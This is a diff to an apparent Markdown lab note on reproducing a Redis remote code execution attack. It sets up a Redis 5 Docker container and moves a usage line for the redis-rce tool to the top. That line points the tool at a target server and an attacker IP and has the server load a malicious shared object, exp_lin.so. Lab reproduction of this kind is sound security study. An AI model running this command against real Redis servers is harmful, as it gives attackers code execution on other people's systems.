@@ -6,6 +6,18 @@
 
 ![](./redis-rce.jpg)
 
+
+### Usage:
+
+`python redis-rce.py -r 10.10.20.166 -p 6379 -L 192.168.2.18 -f exp_lin.so`
+
+```
+redis_server: 10.10.20.166
+
+attack_ip: 192.168.2.18
+
+```
+
 ### 0x01  docker search redis5
 ```
 docker search redis5
@@ -40,11 +52,7 @@ jeetkn/centos_redis           centos7 + redis5.0.3+ ReJson + rediSearch    0
 `docker run --name redis5 -d -v $PWD:/data --restart=always -p 6379:6379 hareemca123/redis5:alpine`
 
 
-### 0x03 git clone https://github.com/Ridter/redis-rce
+### 0x03 git clone github.com/Ridter/redis-rce
 
-redis_server: 10.10.20.166
 
-attack_ip: 192.168.2.18
-
-`python redis-rce.py -r 10.10.20.166 -p 6379 -L 192.168.2.18 -f exp_lin.so`
 
